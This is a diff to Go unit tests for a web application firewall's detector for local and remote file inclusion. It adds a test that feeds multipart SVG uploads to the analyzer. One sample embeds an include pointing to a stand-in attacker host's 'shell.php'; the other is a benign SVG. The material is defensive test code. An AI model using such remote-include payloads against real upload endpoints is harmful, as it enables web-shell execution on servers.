@@ -1,6 +1,15 @@
 package semantic
 
-import "testing"
+import (
+	"bytes"
+	"context"
+	"mime/multipart"
+	"net/http"
+	"net/http/httptest"
+	"testing"
+
+	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
+)
 
 func TestLFIRemoteIncludeContextRequiresSinkEvidenceForGenericFilename(t *testing.T) {
 	cases := []struct {
@@ -33,6 +42,53 @@ func TestLFIRemoteIncludeMultipartXMLNamespaceStaysClean(t *testing.T) {
 	}
 	if got := lfiRemoteIncludeContextForSource("body.multipart", "file", `<svg xmlns="http://www.w3.org/2000/svg"><include href="https://attacker.example.test/shell.php"/></svg>`); !got {
 		t.Fatal("executable remote include inside XML was suppressed")
+	}
+}
+
+func TestLFIRemoteIncludeMultipartFileUsesParsedSource(t *testing.T) {
+	makeRequest := func(t *testing.T, value string) *http.Request {
+		t.Helper()
+		var body bytes.Buffer
+		writer := multipart.NewWriter(&body)
+		part, err := writer.CreateFormFile("file", "upload.svg")
+		if err != nil {
+			t.Fatal(err)
+		}
+		if _, err := part.Write([]byte(value)); err != nil {
+			t.Fatal(err)
+		}
+		if err := writer.Close(); err != nil {
+			t.Fatal(err)
+		}
+		req := httptest.NewRequest(http.MethodPost, "http://x/upload", bytes.NewReader(body.Bytes()))
+		req.Header.Set("Content-Type", writer.FormDataContentType())
+		return req
+	}
+
+	for _, tc := range []struct {
+		name  string
+		value string
+		want  bool
+	}{
+		{name: "svg namespace", value: `<svg xmlns="http://www.w3.org/2000/svg"><circle cx="1" cy="1"/></svg>`, want: false},
+		{name: "executable include", value: `<svg xmlns="http://www.w3.org/2000/svg"><include href="https://attacker.example.test/shell.php"/></svg>`, want: true},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			req := makeRequest(t, tc.value)
+			ctx, err := engine.NewRequestContext(req, "site-test")
+			if err != nil {
+				t.Fatal(err)
+			}
+			ctx.Metadata = map[string]any{}
+			result, err := NewAnalyzer("block", 2).Detect(context.Background(), ctx)
+			if err != nil {
+				t.Fatal(err)
+			}
+			got := result != nil && result.Detected && result.Category == "lfi"
+			if got != tc.want {
+				t.Fatalf("multipart file detection=%v want %v result=%+v metadata=%v", got, tc.want, result, ctx.Metadata)
+			}
+		})
 	}
 }
 
